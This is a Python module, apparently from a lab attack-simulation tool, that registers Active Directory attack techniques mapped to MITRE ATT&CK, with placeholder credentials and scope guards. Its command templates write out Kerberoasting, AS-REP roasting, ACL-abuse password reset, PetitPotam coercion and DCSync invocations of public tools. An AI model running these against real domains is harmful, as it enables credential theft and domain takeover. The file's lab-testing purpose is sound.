"""The technique registry: every atomic technique attack/runner.py can run.

Each entry orchestrates an established, publicly documented open-source
tool — never a novel exploit (SECURITY.md #3) — and cites the MITRE ATT&CK
technique it exercises. `command_template` is what --dry-run prints
verbatim (with `{ip}`/`{hostname}` substituted); credential placeholders
like `<lab_admin_username>` are intentionally left as literal text rather
than interpolated, since real credential injection is Phase 5 platform
work, not something this module should quietly grow on its own.

Every technique here targets `domain_controller` (dc01) because that's
where the LDAP/SMB/Kerberos endpoint each tool actually queries lives —
even unconstrained_delegation_coerce, which is *about* mem01 (the
delegation-trusted host), sends its coercion RPC call to dc01 and expects
the resulting ticket to land at a listener on mem01. Scope-guard
resolution is about "which host does this tool connect to," not "which
host does this technique conceptually concern."
"""

from __future__ import annotations

import dataclasses

from attack.lib.scope_guard import Host


@dataclasses.dataclass(frozen=True)
class Technique:
    id: str
    name: str
    attack_id: str
    attack_url: str
    tool: str
    target_role: str
    kill_chain_phase: str
    command_template: tuple[str, ...]
    mock_fixture: str

    def build_command(self, host: Host) -> list[str]:
        return [part.format(ip=host.ip, hostname=host.hostname) for part in self.command_template]


TECHNIQUES: dict[str, Technique] = {
    "bloodhound_collect": Technique(
        id="bloodhound_collect",
        name="BloodHound/SharpHound domain collection",
        attack_id="T1087.002",
        attack_url="https://attack.mitre.org/techniques/T1087/002/",
        tool="bloodhound-python",
        target_role="domain_controller",
        kill_chain_phase="recon",
        command_template=(
            "bloodhound-python",
            "-d", "eadadl.lab",
            "-u", "<lab_admin_username>",
            "-p", "<lab_admin_password>",
            "-ns", "{ip}",
            "-c", "All",
        ),
        mock_fixture="bloodhound_collect.json",
    ),
    "kerberoasting": Technique(
        id="kerberoasting",
        name="Kerberoasting (request + crack a service ticket)",
        attack_id="T1558.003",
        attack_url="https://attack.mitre.org/techniques/T1558/003/",
        tool="netexec",
        target_role="domain_controller",
        kill_chain_phase="credential_access",
        command_template=(
            "netexec", "ldap", "{ip}",
            "-u", "<lab_admin_username>", "-p", "<lab_admin_password>",
            "--kerberoasting", "kerberoast_output.txt",
        ),
        mock_fixture="kerberoasting.json",
    ),
    "asrep_roasting": Technique(
        id="asrep_roasting",
        name="AS-REP roasting (accounts with pre-auth disabled)",
        attack_id="T1558.004",
        attack_url="https://attack.mitre.org/techniques/T1558/004/",
        tool="netexec",
        target_role="domain_controller",
        kill_chain_phase="credential_access",
        command_template=(
            "netexec", "ldap", "{ip}",
            "-u", "users.txt", "--asreproast", "asrep_output.txt",
        ),
        mock_fixture="asrep_roasting.json",
    ),
    "acl_genericall_abuse": Technique(
        id="acl_genericall_abuse",
        name="ACL abuse: GenericAll grant to reset a target account's password",
        attack_id="T1098",
        attack_url="https://attack.mitre.org/techniques/T1098/",
        tool="bloodyAD",
        target_role="domain_controller",
        kill_chain_phase="privilege_escalation",
        command_template=(
            "bloodyAD", "--host", "{ip}", "-d", "eadadl.lab",
            "-u", "helpdesk-jsmith", "-p", "<compromised_password>",
            "set", "password", "Domain-Backups", "<new_password>",
        ),
        mock_fixture="acl_genericall_abuse.json",
    ),
    "unconstrained_delegation_coerce": Technique(
        id="unconstrained_delegation_coerce",
        name="Coerce authentication to capture a TGT via unconstrained delegation",
        attack_id="T1187",
        attack_url="https://attack.mitre.org/techniques/T1187/",
        tool="PetitPotam (Impacket)",
        target_role="domain_controller",
        kill_chain_phase="lateral_movement",
        command_template=(
            "petitpotam.py", "-d", "eadadl.lab",
            "<lab_admin_username>:<lab_admin_password>",
            "mem01.eadadl.lab", "{ip}",
        ),
        mock_fixture="unconstrained_delegation_coerce.json",
    ),
    "dcsync": Technique(
        id="dcsync",
        name="DCSync: replicate domain credential material",
        attack_id="T1003.006",
        attack_url="https://attack.mitre.org/techniques/T1003/006/",
        tool="impacket-secretsdump",
        target_role="domain_controller",
        kill_chain_phase="domain_dominance",
        command_template=(
            "secretsdump.py", "-just-dc", "eadadl.lab/mem01$@{ip}",
        ),
        mock_fixture="dcsync.json",
    ),
}
